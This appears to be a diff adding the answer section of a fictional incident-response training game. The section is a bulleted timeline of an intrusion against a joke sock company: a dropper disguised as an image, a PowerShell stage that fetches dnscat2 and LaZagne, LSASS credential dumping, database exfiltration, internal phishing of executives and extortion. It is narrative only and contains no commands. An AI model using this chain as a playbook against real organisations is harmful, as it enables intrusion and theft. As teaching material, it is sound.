+            <li>The threat actors engaged in recon using Jus de Chaussette's own website, particularly focusing on how to contact customer service, any information they could exploit for phishing emails (such as the French president's endorsement of Jus de Chaussette's socks), and any suspicious or controversial information regarding the company. They used three distinct IP addresses during this operation.</li>
+            <li>They gained initial access by using the customer service contact form to upload a malicious dropper masquerading as a <samp>.jpeg</samp> file.</li>
+            <li>Customer Service Representative Mike Oz took on the case, opened the file, and had a <samp>.ps1</samp> file dropped and executed on his device.</li>
+            <li>Said PowerShell script downloaded, installed and executed <samp>dnscat2</samp> and <samp>LaZagne</samp>.</li>
+            <li><samp>dnscat2</samp> was used to establish a connection to the attacker's command and control server and gain hands-on-keyboard access.</li>
+            <li><samp>LaZagne</samp> was used to dump credentials from LSASS, including credentials for the customer database and the corporate mailbox.</li>
+            <li>The attackers dumped the contents of the customer database to a <samp>.csv</samp> file in a staging folder, which they later compressed, encrypted and uploaded to their server.</li>
+            <li>Using Mike Oz's email account, they sent internal phishing emails to CEO Cho Cetkipu and CFO Brooke Entoe with a link to download a malicious <samp>.docx</samp> file.</li>
+            <li>The process is repeated; the PowerShell script is dropped and executed, the attackers establish a connection to their servers with <samp>dnscat2</samp> and dump credentials with <samp>LaZagne</samp>.</li>
+            <li>Some time later, they connect to the intranet and download sensitive corporate information from it.</li>
+            <li>Finally, they send the extortion email from an external email address.</li>
+          </ul>
+        </section> <!--section 1-->
+      </article> <!--game sections-->
+      <a class="skip" href="#page-navigation">Return to page navigation</a>
+    </main><!--main page content-->
+  </body>
+</html>
